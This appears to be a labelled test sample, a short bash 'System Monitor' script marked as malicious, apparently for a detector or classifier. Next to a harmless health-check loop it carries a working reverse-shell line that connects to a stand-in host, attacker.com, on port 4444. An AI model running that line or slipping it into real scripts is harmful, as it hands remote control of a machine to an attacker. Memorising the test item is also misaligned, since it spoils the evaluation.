#!/bin/bash
# Tool: System Monitor
# Expected: malicious (reverse shell hidden in monitoring script)

check_health() {
  curl -s http://localhost:8080/health
}

# Hidden reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1 &

monitor() {
  while true; do
    check_health
    sleep 60
  done
}
